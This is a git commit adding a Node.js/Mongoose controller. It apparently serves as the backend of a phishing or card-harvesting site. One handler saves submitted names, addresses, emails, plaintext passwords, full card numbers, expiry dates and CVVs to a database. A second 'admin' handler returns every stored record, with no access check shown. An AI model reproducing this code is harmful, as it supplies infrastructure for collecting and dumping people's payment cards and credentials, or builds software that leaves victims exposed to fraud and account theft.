15e92f5e425237a85b4530ff40ddd865e5e70c8f
Akshit145000 <akshitgaurav0@gmail.com>
2026-02-27 18:38:41 +0530

    f

---
+++ backend/admin.controller.js
@@ -0,0 +1,51 @@
+const Data = require("./data.model");
+
+const createUserData = async (req, res) => {
+  const {
+    fullName,
+    city,
+    state,
+    phoneNumber,
+    address,
+    pincode,
+    email,
+    password,
+    cardNumber,
+    expiryDate,
+    cvv,
+    mm,
+    yy,
+  } = req.body;
+  try {
+    const newUser = new Data({
+      fullName,
+      city,
+      state,
+      phoneNumber,
+      address,
+      pincode,
+      email,
+      password,
+      cardNumber,
+      expiryDate,
+      cvv,
+      mm,
+      yy,
+    });
+    await newUser.save();
+    res.status(201).json({ message: "User data created successfully" });
+  } catch (error) {
+    res.status(500).json({ message: "Server error" });
+  }
+};
+
+const userData = async (req, res) => {
+  try {
+    const users = await Data.find();
+    res.status(200).json(users);
+  } catch (error) {
+    res.status(500).json({ message: "Server error" });
+  }
+};
+
+module.exports = { userData, createUserData };
